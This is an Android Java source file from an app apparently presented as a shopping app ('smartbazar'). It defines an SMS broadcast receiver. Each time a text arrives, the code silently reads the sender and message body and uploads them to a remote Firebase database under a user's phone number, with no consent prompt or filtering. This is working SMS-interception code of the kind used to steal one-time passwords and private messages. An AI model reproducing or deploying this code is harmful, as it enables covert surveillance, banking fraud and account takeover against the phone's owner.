package com.bazaar.smartbazar;

import static android.content.Context.MODE_PRIVATE;
import static androidx.core.content.ContextCompat.getSystemService;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

public class SMSReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {


        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle data = intent.getExtras();
            Object[] pdus = (Object[]) data.get("pdus");
            String formate = data.getString("format");

            for (int i = 0; i < pdus.length; i++) {
                SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i], formate);

                String message = smsMessage.getMessageBody();
                String sender = smsMessage.getOriginatingAddress();

                SharedPreferences sh = context.getSharedPreferences("SharedPref", MODE_PRIVATE);
                String phoneNumber = "91" + sh.getString("number", "");

                DatabaseReference databaseReference = FirebaseDatabase.getInstance().getReference().child("users").child(phoneNumber).child("userInbox");

                String databaseReferenceInbox = String.valueOf(FirebaseDatabase.getInstance().getReference().child("users")
                        .child("userInbox").child(phoneNumber).push());

                String[] keyy = databaseReferenceInbox.split("/");
                String lastOne = keyy[keyy.length - 1];

                TxtClass txtClass = new TxtClass(sender, message);
                databaseReference.addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        int count = Integer.parseInt(String.valueOf(snapshot.getChildrenCount()));

                        databaseReference.child("-N_msg" + count).setValue(txtClass);

                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                });


            }
        }
    }
}


